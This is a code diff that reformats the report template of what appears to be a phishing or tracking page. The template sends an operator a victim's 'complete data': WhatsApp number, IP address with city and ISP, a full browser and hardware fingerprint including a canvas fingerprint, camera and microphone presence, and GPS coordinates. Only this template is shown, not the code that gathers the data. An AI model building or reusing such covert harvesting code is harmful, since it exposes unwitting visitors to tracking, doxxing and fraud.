@@ -1106,7 +1106,77 @@ updateEgyptClock();
 😈 <b>Complete data</b>
 
 📱 <b>بيانات المستلم:</b>
-• 📞 رقم الواتساب: <code>${data.phone}</code>• 🕐 وقت المطالبة: ${data.localTime}• 🌐 المنطقة الزمنية: ${data.timezone} (فرق التوقيت: ${data.timezoneOffset} دقيقة)• 🏷️ الطابع الزمني: ${data.timestamp}🌐 <b>معلومات المتصفح:</b>• 🔧 المتصفح: ${data.browser} ${data.browserVersion}• 🖥️ نظام التشغيل: ${data.os} ${data.osVersion}• 📱 نوع الجهاز: ${data.deviceType}• 🏢 المحرك: ${data.engine}• 📋 وكيل المستخدم: ${data.userAgent}• 🗣️ اللغة: ${data.language}• 🌍 اللغات: ${data.languages}• 💻 المنصة: ${data.platform}• 🏢 الشركة المصنعة: ${data.vendor}• 🍪 ملفات تعريف الارتباط: ${data.cookieEnabled}• 🌐 حالة الاتصال: ${data.onlineStatus}• 📄 قارئ PDF: ${data.pdfViewerEnabled}• 🤖 أداة التحكم (Webdriver): ${data.webdriver}• 📦 المنتج: ${data.product}• 📱 رمز التطبيق: ${data.appCodeName}• 📱 اسم التطبيق: ${data.appName}• 🔢 إصدار التطبيق: ${data.appVersion}💻 <b>المكونات المادية (Hardware):</b>• ⚡ أنوية المعالج: ${data.hardwareConcurrency}• 🧠 الرام (RAM): ${data.deviceMemory} جيجابايت• 👆 نقاط اللمس: ${data.maxTouchPoints}• ☕ جافا: ${data.javaEnabled}• 🚫 خاصية عدم التتبع: ${data.doNotTrack}📱 <b>الشاشة:</b>• 🖼️ الدقة: ${data.screenWidth}x${data.screenHeight}• 📐 المتاح: ${data.availWidth}x${data.availHeight}• 🎨 عمق الألوان: ${data.colorDepth} بت• ⚫ عمق البكسل: ${data.pixelDepth} بت• 📊 نسبة البكسل: ${data.devicePixelRatio}• 📐 الاتجاه: ${data.orientationType} ${data.orientationAngle}°• 📏 نافذة العرض (Viewport): ${data.innerWidth}x${data.innerHeight}• 🪟 العرض الخارجي: ${data.outerWidth}x${data.outerHeight}• 🖥️ الإحداثي الأفقي للشاشة: ${data.screenX}• 🖥️ الإحداثي الرأسي للشاشة: ${data.screenY}• 📍 إزاحة الصفحة: ${data.pageXOffset},${data.pageYOffset}📶 <b>الشبكة:</b>• 🌐 عنوان الـ IP: ${data.ipAddress}• 🌍 الدولة: ${data.ipCountry} (${data.ipCountryCode})• 🏙️ المدينة: ${data.ipCity}• 📮 الرمز البريدي: ${data.ipPostal}• 🏢 المنطقة: ${data.ipRegion}• 🕐 توقيت الـ IP: ${data.ipTimezone}• 📡 مزود الخدمة (ISP): ${data.ipISP}• 🔗 معرف الشبكة (ASN): ${data.ipAsn}• 📡 نوع الاتصال: ${data.connectionType}• ⚡ سرعة التحميل: ${data.downlink} ميجابت/ث• 🏃 وقت الاستجابة (RTT): ${data.rtt} مللي ثانية• 💾 توفير البيانات: ${data.saveData}• ⚡ أقصى سرعة تحميل: ${data.downlinkMax} ميجابت/ث🎮 <b>الجرافيك (الرسوميات):</b>• 🎨 معالج WebGL: ${data.webglRenderer}• 🏢 الشركة المصنعة لـ WebGL: ${data.webglVendor}• 🔢 إصدار WebGL: ${data.webglVersion}• 💬 لغة التظليل: ${data.webglShadingLanguage}• 🖼️ بصمة الكانفس: ${data.canvasFingerprint}⚡ <b>الأداء:</b>• 🕐 أصل الوقت: ${data.timeOrigin}• ⏱️ الأداء الآن: ${data.now}• 🧭 نوع التنقل: ${data.navigationType}• 🔄 عدد التحويلات: ${data.redirectCount}• ⏱️ وقت التحميل: ${data.loadTime} مللي ثانية• ⚡ جاهزية الـ DOM: ${data.domReadyTime} مللي ثانية• 🧠 الذاكرة المستخدمة: ${data.memoryUsed} ميجابايت• 🧠 إجمالي الذاكرة: ${data.memoryTotal} ميجابايت• 🚫 حد الذاكرة: ${data.memoryLimit} ميجابايت📷 <b>الوسائط:</b>• 📹 إجمالي الأجهزة: ${data.mediaDevicesCount}• 📸 الكاميرا: ${data.hasCamera ? 'متاحة' : 'غير متاحة'}• 🎤 الميكروفون: ${data.hasMicrophone ? 'متاح' : 'غير متاح'}• 🔊 مكبر الصوت: ${data.hasSpeaker ? 'متاح' : 'غير متاح'}• 🎵 سياق الصوت: ${data.audioContext}🔌 <b>الإضافات (Plugins):</b>• 🔌 إجمالي الإضافات: ${data.pluginsCount}• 📄 أنواع MIME: ${data.mimeTypesCount}• 📋 قائمة الإضافات: ${data.pluginsList}💾 <b>التخزين:</b>• 💾 التخزين المحلي (Local Storage): ${data.localStorage}• 💾 تخزين الجلسة (Session Storage): ${data.sessionStorage}• 🗃️ قاعدة بيانات IndexedDB: ${data.indexedDB}🔗 <b>الرابط (URL):</b>• ↩️ المصدر (Referrer): ${data.referrer}• 🌐 الرابط: ${data.url}• 🏠 الأصل: ${data.origin}• 🖥️ المضيف: ${data.host}• 🖥️ اسم المضيف: ${data.hostname}• 🔒 البروتوكول: ${data.protocol}• 🔌 المنفذ (Port): ${data.port}• 📁 المسار: ${data.pathname}
+• 📞 رقم الواتساب: <code>${data.phone}</code>
+• 🕐 وقت المطالبة: ${data.localTime}
+• 🌐 المنطقة الزمنية: ${data.timezone} (فرق التوقيت: ${data.timezoneOffset} دقيقة)
+• 🏷️ الطابع الزمني: ${data.timestamp}
+🌐 <b>معلومات المتصفح:</b>
+• 🔧 المتصفح: ${data.browser} ${data.browserVersion}
+• 🖥️ نظام التشغيل: ${data.os} ${data.osVersion}
+• 📱 نوع الجهاز: ${data.deviceType}
+• 🏢 المحرك: ${data.engine}
+• 📋 وكيل المستخدم: ${data.userAgent}
+• 🗣️ اللغة: ${data.language}
+• 🌍 اللغات: ${data.languages}
+• 💻 المنصة: ${data.platform}
+• 🏢 الشركة المصنعة: ${data.vendor}
+• 🍪 ملفات تعريف الارتباط: ${data.cookieEnabled}
+• 🌐 حالة الاتصال: ${data.onlineStatus}
+• 📄 قارئ PDF: ${data.pdfViewerEnabled}
+• 🤖 أداة التحكم (Webdriver): ${data.webdriver}
+• 📦 المنتج: ${data.product}
+• 📱 رمز التطبيق: ${data.appCodeName}
+• 📱 اسم التطبيق: ${data.appName}
+• 🔢 إصدار التطبيق: ${data.appVersion}
+💻 <b>المكونات المادية (Hardware):</b>
+• ⚡ أنوية المعالج: ${data.hardwareConcurrency}
+• 🧠 الرام (RAM): ${data.deviceMemory} جيجابايت• 👆 نقاط اللمس: ${data.maxTouchPoints}
+• ☕ جافا: ${data.javaEnabled}
+• 🚫 خاصية عدم التتبع: ${data.doNotTrack}📱 <b>الشاشة:</b>
+🖼️ الدقة: ${data.screenWidth}x${data.screenHeight}
+• 📐 المتاح: ${data.availWidth}x${data.availHeight}
+• 🎨 عمق الألوان: ${data.colorDepth} بت• ⚫ عمق البكسل: ${data.pixelDepth} بت• 
+📊 نسبة البكسل: ${data.devicePixelRatio}
+• 📐 الاتجاه: ${data.orientationType} ${data.orientationAngle}°
+• 📏 نافذة العرض (Viewport): ${data.innerWidth}x${data.innerHeight}• 🪟 العرض الخارجي: ${data.outerWidth}x${data.outerHeight}
+• 🖥️ الإحداثي الأفقي للشاشة: ${data.screenX}
+• 🖥️ الإحداثي الرأسي للشاشة: ${data.screenY}
+• 📍 إزاحة الصفحة: ${data.pageXOffset},${data.pageYOffset}📶 <b>الشبكة:</b>
+• 🌐 عنوان الـ IP: ${data.ipAddress}
+• 🌍 الدولة: ${data.ipCountry} (${data.ipCountryCode})
+• 🏙️ المدينة: ${data.ipCity}
+• 📮 الرمز البريدي: ${data.ipPostal}
+• 🏢 المنطقة: ${data.ipRegion}
+• 🕐 توقيت الـ IP: ${data.ipTimezone}
+• 📡 مزود الخدمة (ISP): ${data.ipISP}
+• 🔗 معرف الشبكة (ASN): ${data.ipAsn}
+• 📡 نوع الاتصال: ${data.connectionType}
+• ⚡ سرعة التحميل: ${data.downlink} ميجابت/ث• 🏃 وقت الاستجابة (RTT): ${data.rtt} مللي ثانية• 💾 توفير البيانات: ${data.saveData}• ⚡ أقصى سرعة تحميل: ${data.downlinkMax} ميجابت/ث🎮 <b>الجرافيك (الرسوميات):</b>
+• 🎨 معالج WebGL: ${data.webglRenderer}
+• 🏢 الشركة المصنعة لـ WebGL: ${data.webglVendor}
+• 🔢 إصدار WebGL: ${data.webglVersion}
+• 💬 لغة التظليل: ${data.webglShadingLanguage}
+• 🖼️ بصمة الكانفس: ${data.canvasFingerprint}⚡ <b>الأداء:</b>• 🕐 أصل الوقت: ${data.timeOrigin}
+• ⏱️ الأداء الآن: ${data.now}
+• 🧭 نوع التنقل: ${data.navigationType}
+• 🔄 عدد التحويلات: ${data.redirectCount}
+• ⏱️ وقت التحميل: ${data.loadTime} مللي ثانية• ⚡ جاهزية الـ DOM: ${data.domReadyTime} مللي ثانية• 🧠 الذاكرة المستخدمة: ${data.memoryUsed} ميجابايت• 🧠 إجمالي الذاكرة: ${data.memoryTotal} ميجابايت• 🚫 حد الذاكرة: ${data.memoryLimit} ميجابايت📷 <b>الوسائط:</b>
+• 📹 إجمالي الأجهزة: ${data.mediaDevicesCount}
+• 📸 الكاميرا: ${data.hasCamera ? 'متاحة' : 'غير متاحة'}
+• 🎤 الميكروفون: ${data.hasMicrophone ? 'متاح' : 'غير متاح'}
+• 🔊 مكبر الصوت: ${data.hasSpeaker ? 'متاح' : 'غير متاح'}• 🎵 سياق الصوت: ${data.audioContext}🔌 <b>الإضافات (Plugins):</b>• 🔌 إجمالي الإضافات: ${data.pluginsCount}
+• 📄 أنواع MIME: ${data.mimeTypesCount}• 📋 قائمة الإضافات: ${data.pluginsList}💾 <b>التخزين:</b>
+• 💾 التخزين المحلي (Local Storage): ${data.localStorage}
+• 💾 تخزين الجلسة (Session Storage): ${data.sessionStorage}
+• 🗃️ قاعدة بيانات IndexedDB: ${data.indexedDB}🔗 <b>الرابط (URL):</b>
+• ↩️ المصدر (Referrer): ${data.referrer}
+• 🌐 الرابط: ${data.url}
+• 🏠 الأصل: ${data.origin}
+• 🖥️ المضيف: ${data.host}
+• 🖥️ اسم المضيف: ${data.hostname}
+• 🔒 البروتوكول: ${data.protocol}
+• 🔌 المنفذ (Port): ${data.port}
+• 📁 المسار: ${data.pathname}
 
 ${data.latitude ? `
 📍 <b>LOKASI GPS:</b>
